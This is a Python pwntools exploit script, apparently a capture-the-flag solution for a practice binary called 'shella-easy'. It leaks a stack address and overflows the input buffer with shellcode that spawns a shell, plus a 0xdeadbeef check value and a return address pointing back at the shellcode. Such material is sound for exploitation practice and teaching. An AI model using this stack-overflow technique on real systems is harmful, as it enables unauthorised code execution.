#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./shella-easy
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './shella-easy')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x8048000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No
shellcode = asm(shellcraft.i386.sh())

io = start()

io.recvuntil("Yeah I'll have a ")
mem_addr_of_inpt = io.recvuntil(" ")
io.recvline()
mem_addr_of_inpt = mem_addr_of_inpt.decode('utf-8')[:-1]
mem_addr_of_inpt = int(mem_addr_of_inpt,16)

payload = b""
payload += shellcode
payload += b"A"*(64 - len(shellcode))
payload += p32(int("0xdeadbeef",16))
payload += b"B"*(76 - len(payload))
payload += p32(mem_addr_of_inpt)

# p32(int("0xcafebabe",16))
# print(mem_addr_of_inpt)
io.sendline(payload)
io.interactive()